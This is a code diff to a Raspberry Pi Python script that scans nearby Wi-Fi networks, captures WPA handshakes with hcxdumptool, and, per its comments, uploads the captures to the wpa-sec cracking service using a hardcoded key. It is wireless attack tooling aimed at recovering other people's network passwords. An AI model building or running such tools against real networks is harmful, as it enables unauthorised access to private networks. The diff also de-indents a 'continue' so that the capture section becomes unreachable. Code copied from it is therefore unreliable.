@@ -22,6 +22,7 @@ def get_interface():  # Sets the Ralink wireless adapter in moditor mode using a
     p = subprocess.Popen(get_monitor_interface, stdout=subprocess.PIPE, shell=True)
     (output, err) = p.communicate()
     interface = output.decode('utf-8').replace('\n', '')
+
     return interface
 
 
@@ -36,35 +37,70 @@ def send_location():
     return 0
 
 
+def network_scan():
+    get_adapter = """airmon-ng | awk '{ if ($4 == "Broadcom") print $2 }'"""
+    p = subprocess.Popen(get_adapter, stdout=subprocess.PIPE, shell=True)
+    (output, err) = p.communicate()
+    interface = output.decode('utf-8').replace('\n', '')
+
+    cmd = 'iwlist ' + interface + ' scanning'
+    p = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
+    result = p.communicate()[0]
+
+    networks = result.decode('utf-8').split('Cell')
+
+    print(interface)
+
+    json_data = {}
+    data = {}
+    json_data["networks"] = networks
+
+    for idx, network in enumerate(json_data["networks"]):
+        json_data["networks"][idx] = network.split('\n')
+
+    file = open("/home/rumen/WiFinder/rpi_setup/networks", "w+")
+    json.dump(json_data, file)
+    file.close()
+
+
 interface = get_interface()
+
 
 while True:
     # Checks device status
     status_file = open("/home/rumen/WiFinder/rpi_setup/status", "r")
     status = status_file.read()
     status_file.close()
+
+    # Scan for nearby networks
+    # if os.path.exists("/home/rumen/WiFinder/rpi_setup/networks"):
+    #     os.remove("/home/rumen/WiFinder/rpi_setup/networks")
+
+    network_scan()
+
     if status == '0':
         time.sleep(2)
         continue
     elif status == '3':
         time.sleep(2)
-        continue
+    continue
 
     # Removes leftover capture
-    if os.path.exists("/root/rumen/WiFinder/rpi_setup/capture.cap"):
+    if os.path.exists("/home/rumen/WiFinder/rpi_setup/capture.cap"):
         os.remove("/home/rumen/WiFinder/rpi_setup/capture.cap")
 
-    hcxCommand = "sudo hcxdumptool -i" + interface + " -o /home/rumen/WiFinder/rpi_setup/capture.cap" \
-                                                     "--filterlist=/home/rumen/WiFinder/rpi_setup/whitelist.txt " \
-                                                     "--filtermode=1 "
-
+    hcxCommand = "sudo hcxdumptool -i " + interface + " -o /home/rumen/WiFinder/rpi_setup/capture.cap " \
+                                                      "--filterlist=/home/rumen/WiFinder/rpi_setup/whitelist.txt " \
+                                                      "--filtermode=1 "
+    print(hcxCommand)
     # Captures handshakes for a period of 1 minute
     process = subprocess.Popen(hcxCommand.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
-    time.sleep(60)
+    time.sleep(30)
     process.kill()
     time.sleep(5)
-    os.remove("/home/rumen/WiFinder/rpi_setup/whitelist.txt")
+    if os.path.exists("/home/rumen/WiFinder/rpi_setup/whitelist.txt"):
+        os.remove("/home/rumen/WiFinder/rpi_setup/whitelist.txt")
 
     # Sends the capture to wpa-sec
     cookie = {'key': '7fcb3ff5176fb532124b5ac3e4616a04'}
@@ -89,7 +125,8 @@ while True:
 
     result = json.loads(json.dumps(data))
     for network in result:
-        whitelist.write(network[0])
+        whitelist.write(network[0].replace(':', ''))
         whitelist.write('\n')
 
     whitelist.close()
+
